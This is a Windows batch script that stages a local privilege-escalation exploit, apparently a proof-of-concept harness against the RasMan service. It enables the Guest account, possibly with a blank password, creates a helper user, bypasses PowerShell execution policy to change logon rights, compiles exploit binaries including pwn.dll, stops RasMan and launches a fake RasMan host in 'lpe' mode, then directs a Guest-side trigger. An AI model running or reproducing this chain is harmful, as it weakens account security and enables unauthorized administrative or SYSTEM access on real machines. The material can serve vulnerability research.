@echo off
setlocal

cd /d C:\Users\Public\Desktop\EXPLOIT

echo [+] Starting administrative setup
echo [+] Working directory: C:\Users\Public\Desktop\EXPLOIT
echo.

set "HELPER_USER=guestlab"
set /p INPUT_HELPER_USER=[?] Low-priv helper username [guestlab]: 
if defined INPUT_HELPER_USER set "HELPER_USER=%INPUT_HELPER_USER%"
set /p HELPER_PASSWORD=[?] Password for %HELPER_USER% [password]: 
if not defined HELPER_PASSWORD set "HELPER_PASSWORD=password"
set /p GUEST_PASSWORD=[?] Built-in Guest password [blank]: 

set "VSDEVCMD="
if exist "C:\Program Files\Microsoft Visual Studio\18\Community\Common7\Tools\VsDevCmd.bat" set "VSDEVCMD=C:\Program Files\Microsoft Visual Studio\18\Community\Common7\Tools\VsDevCmd.bat"
if not defined VSDEVCMD if exist "C:\Program Files\Microsoft Visual Studio\2022\Community\Common7\Tools\VsDevCmd.bat" set "VSDEVCMD=C:\Program Files\Microsoft Visual Studio\2022\Community\Common7\Tools\VsDevCmd.bat"
if not defined VSDEVCMD if exist "C:\Program Files\Microsoft Visual Studio\2022\BuildTools\Common7\Tools\VsDevCmd.bat" set "VSDEVCMD=C:\Program Files\Microsoft Visual Studio\2022\BuildTools\Common7\Tools\VsDevCmd.bat"
if not defined VSDEVCMD if exist "C:\Program Files (x86)\Microsoft Visual Studio\2022\BuildTools\Common7\Tools\VsDevCmd.bat" set "VSDEVCMD=C:\Program Files (x86)\Microsoft Visual Studio\2022\BuildTools\Common7\Tools\VsDevCmd.bat"

if not defined VSDEVCMD (
    echo [!] Could not find VsDevCmd.bat automatically
    set /p VSDEVCMD=[?] Enter the full path to VsDevCmd.bat: 
)

if not exist "%VSDEVCMD%" (
    echo [!] VsDevCmd.bat was not found at: %VSDEVCMD%
    exit /b 1
)

echo [+] Using toolchain: %VSDEVCMD%
call "%VSDEVCMD%" -arch=amd64
if errorlevel 1 (
    echo [!] Failed to initialize the MSVC build environment
    exit /b 1
)

echo [+] Enabling built-in Guest and applying account settings
net user Guest /active:yes
net user Guest "%GUEST_PASSWORD%"
net user %HELPER_USER% >nul 2>&1
if errorlevel 1 (
    echo [+] Creating low-priv helper user %HELPER_USER%
    net user %HELPER_USER% "%HELPER_PASSWORD%" /add
) else (
    echo [+] Updating password for existing %HELPER_USER%
    net user %HELPER_USER% "%HELPER_PASSWORD%"
)
net localgroup "Remote Desktop Users" Guest /add >nul 2>&1

echo [+] Repairing Guest logon rights
powershell -ExecutionPolicy Bypass -File fix_guest_logon.ps1
if errorlevel 1 (
    echo [!] Failed to update Guest logon rights
    exit /b 1
)

echo [+] Building exploit binaries
cl /nologo /EHsc /std:c++17 /W3 /O2 /MT exploit_host2.cpp /link /out:exploit_host2.exe
if errorlevel 1 exit /b 1
cl /nologo /W3 /O2 /MT /LD /DUNICODE /D_UNICODE /DHELPER_USER=\"%HELPER_USER%\" pwn.c /link advapi32.lib /out:pwn.dll
if errorlevel 1 exit /b 1
cl /nologo /W3 /O2 /MT signal_event.c /link /out:signal_event.exe
if errorlevel 1 exit /b 1
cl /nologo /W3 /O2 /MT /DUNICODE /D_UNICODE launch_guest.c /link advapi32.lib /out:launch_guest.exe
if errorlevel 1 exit /b 1
cl /nologo /W3 /O2 /MT /DUNICODE /D_UNICODE launch_builtin_guest.c /link advapi32.lib /out:launch_builtin_guest.exe
if errorlevel 1 exit /b 1
cl /nologo /W3 /O2 /MT /DUNICODE /D_UNICODE list_sessions.c /link wtsapi32.lib /out:list_sessions.exe
if errorlevel 1 exit /b 1
cl /nologo /W3 /O2 /MT /DUNICODE /D_UNICODE probe_console_token.c /link wtsapi32.lib advapi32.lib /out:probe_console_token.exe
if errorlevel 1 exit /b 1
cl /nologo /W3 /O2 /MT query_shared_connection.c /link rasapi32.lib /out:query_shared_connection.exe
if errorlevel 1 exit /b 1

echo [+] Resetting old proof files and process state
net localgroup Administrators %HELPER_USER% /delete >nul 2>&1
taskkill /IM exploit_host2.exe /F >nul 2>&1
del /f /q system.txt load.txt group_add.txt squatter.log >nul 2>&1

echo [+] Preparing service state
sc stop RasMan >nul 2>&1
sc start RasAuto >nul 2>&1

echo [+] Starting the fake RasMan host as low-priv %HELPER_USER%
launch_guest.exe --user "%HELPER_USER%" --password "%HELPER_PASSWORD%" "C:\Users\Public\Desktop\EXPLOIT\exploit_host2.exe --mode lpe"
if errorlevel 1 (
    echo [!] Failed to start exploit_host2.exe as %HELPER_USER% ^(error %errorlevel%^)
    exit /b 1
)

echo [+] Current session state
quser
echo.
list_sessions.exe
echo.
probe_console_token.exe
echo.
echo [+] Administrative setup complete
echo [+] Next step: log in as built-in Guest and run guest_trigger.cmd
